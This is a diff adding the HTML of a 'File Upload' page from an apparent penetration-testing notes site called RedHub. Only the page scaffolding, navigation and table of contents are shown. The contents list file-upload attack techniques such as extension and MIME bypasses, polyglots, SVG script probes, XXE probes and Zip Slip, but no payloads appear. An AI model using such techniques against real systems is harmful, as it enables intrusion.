@@ -1,0 +1,4004 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+        <meta name="author" content="yunni">
+      
+      
+        <link rel="canonical" href="https://yunniperka.github.io/RedHub/Web/File_Upload/">
+      
+      
+        <link rel="prev" href="../File_Inclusion/">
+      
+      
+        <link rel="next" href="../IDOR/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.6">
+    
+    
+      
+        <title>File Upload - RedHub</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.484c7ddc.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Inter:300,300i,400,400i,700,700i%7CFira+Code:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Inter";--md-code-font:"Fira Code"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/custom.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#file-upload" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="RedHub" class="md-header__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            RedHub
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              File Upload
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="custom" data-md-color-accent="custom"  aria-hidden="true"  type="radio" name="__palette" id="__palette_0">
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--integrated" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="RedHub" class="md-nav__button md-logo" aria-label="RedHub" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    RedHub
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Home
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Windows
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Windows
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Linux
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Linux
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../dupa.md" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dupa
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enterprise Environments
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Enterprise Environments
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AD/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Active Directory
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Web Security
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Web Security
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Initial_Reconnaissance/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSTI/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSTI (Server Side Template Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Command_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XXE/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE (XML External Entity Injection)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cypher_Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cypher Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS (Cross-Site Scripting)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF (Server-Side Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF (Cross-Site Request Forgery)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File_Inclusion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Inclusion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    File Upload
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Introduction
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#useful-resources" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Useful Resources
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#basic-mental-model" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic Mental Model
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#where-to-test" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Where to Test
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#high-value-parameter-names" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        High-Value Parameter Names
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#baseline-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Baseline Workflow
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#first-probe-files" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        First Probe Files
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="First Probe Files">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#text-marker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Text Marker
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#minimal-html-probe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Minimal HTML Probe
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#svg-probe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SVG Probe
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#minimal-valid-png-header-marker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Minimal Valid PNG Header Marker
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#upload-response-signals" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Upload Response Signals
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dangerous-extensions" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Dangerous Extensions
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Dangerous Extensions">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PHP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#asp-aspnet-iis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ASP / ASP.NET / IIS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jsp-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        JSP / Java
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#perl-cgi" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Perl / CGI
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#coldfusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ColdFusion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#node-javascript" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Node / JavaScript
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#client-side-parser-relevant" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Client-Side / Parser-Relevant
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#extension-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Extension Bypass
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Extension Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#double-extension" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Double Extension
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#case-variation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Case Variation
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#trailing-dot-space" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trailing Dot / Space
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#null-byte-legacy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Null Byte Legacy
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#slash-path-confusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Slash / Path Confusion
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#newline-crlf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Newline / CRLF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#rtlo-filename-trick" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        RTLO Filename Trick
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#long-filename-truncation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Long Filename Truncation
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#mime-content-type-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        MIME / Content-Type Bypass
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#magic-byte-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Magic Byte Bypass
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Magic Byte Bypass">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#gif" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GIF
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#png" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PNG
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#jpeg" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        JPEG
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#pdf" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PDF
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#polyglot-ideas" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Polyglot Ideas
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#image-metadata-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Image Metadata Payloads
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Image Metadata Payloads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#add-exif-comment" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Add EXIF Comment
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#read-metadata-back" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Read Metadata Back
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#svg-upload-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SVG Upload Testing
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="SVG Upload Testing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#basic-svg-marker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Basic SVG Marker
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#svg-script-probe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SVG Script Probe
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#svg-external-reference-probe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        SVG External Reference Probe
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#html-upload-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        HTML Upload Testing
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#csv-formula-injection-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        CSV / Formula Injection Uploads
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#xml-xxe-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        XML / XXE Uploads
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="XML / XXE Uploads">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#harmless-xml-marker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Harmless XML Marker
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#oast-xxe-probe" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        OAST XXE Probe
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#archive-upload-testing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Archive Upload Testing
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Archive Upload Testing">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#zip-marker" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ZIP Marker
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#zip-slip-path-traversal" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Zip Slip Path Traversal
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#concatenated-zip-parser-disagreement" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Concatenated ZIP Parser Disagreement
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#archive-bomb-dos-note" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Archive Bomb / DoS Note
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#path-traversal-in-filename" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Path Traversal in Filename
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows-filename-tricks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Windows Filename Tricks
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows Filename Tricks">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#reserved-names" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Reserved Names
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#trailing-dots-and-spaces" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trailing Dots and Spaces
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ntfs-ads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        NTFS ADS
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#invalid-special-characters" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Invalid / Special Characters
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#server-specific-upload-angles" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Server-Specific Upload Angles
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Server-Specific Upload Angles">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#apache-php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Apache + PHP
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#iis-aspnet" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IIS / ASP.NET
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tomcat-java" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Tomcat / Java
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#nginx-php-fpm" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Nginx + PHP-FPM
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#configuration-file-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Configuration File Uploads
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Configuration File Uploads">
